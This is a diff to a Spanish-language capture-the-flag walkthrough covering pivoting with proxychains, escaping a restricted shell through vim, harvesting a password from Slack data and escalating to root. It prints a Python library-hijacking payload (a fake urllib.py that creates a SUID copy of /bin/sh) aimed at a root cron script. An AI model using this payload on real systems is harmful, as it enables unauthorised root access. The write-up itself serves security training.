@@ -109,7 +109,7 @@ Miramos el contenido de archivos interesantes.
 
 <figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
-## Again and again
+## Seclusion is an illusion
 
 Si hacemos `ifconfig` vemos que tenemos una subret por lo que miramos cuales están activos.
 
@@ -169,4 +169,47 @@ proxychains ssh margaret@172.16.1.10
 
 Vemos que tenemos una shell restringida pero está vim.
 
-<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+{% embed url="https://gtfobins.github.io/gtfobins/vim/" %}
+
+<figure><img src="../.gitbook/assets/image (1716).png" alt=""><figcaption></figcaption></figure>
+
+## Snake it 'til you make it
+
+Se encontró un directorio `.config/Slack` en el home del usuario, lo que concuerda con una tarea pendiente relacionada con la integración de Slack.
+
+Slack suele guardar datos del usuario en `~/.config/Slack`. Si un administrador exporta los datos del workspace, se guardan en formato **JSON**.
+
+<figure><img src="../.gitbook/assets/image (1717).png" alt=""><figcaption></figcaption></figure>
+
+Cambiamos al usuario Frank con esa contraseña. Vemos que contiene un archivo.
+
+<figure><img src="../.gitbook/assets/image (1718).png" alt=""><figcaption></figcaption></figure>
+
+Ejecutamos **pspy**.
+
+<figure><img src="../.gitbook/assets/image (1719).png" alt=""><figcaption></figcaption></figure>
+
+La salida de **pspy** revela que **root** ejecuta el script cada minuto. El script no es escribible por **frank**, aunque importa los módulos `call` y `urllib`. Python dispone de una lista de rutas de búsqueda para sus librerías. Esto puede verse ejecutando los siguientes comandos.
+
+```
+>>> import sys
+>>> sys.path
+['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu',
+'/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old',
+'/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages',
+'/usr/lib/python2.7/dist-packages']
+```
+
+Python primero comprueba los módulos en el directorio de trabajo actual, antes de mirar en las demás rutas. Podemos intentar secuestrar la carga de los módulos legítimos `call` o `urllib`, de modo que en su lugar se cargue nuestro módulo malicioso. Creemos un archivo `urllib.py` en la carpeta `/home/frank` con el contenido que aparece a continuación.
+
+```
+import os
+os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
+```
+
+<figure><img src="../.gitbook/assets/image (1720).png" alt=""><figcaption></figcaption></figure>
+
+Miramos la flag `/root/flag.txt`
+
+## Feeling fintastic
+
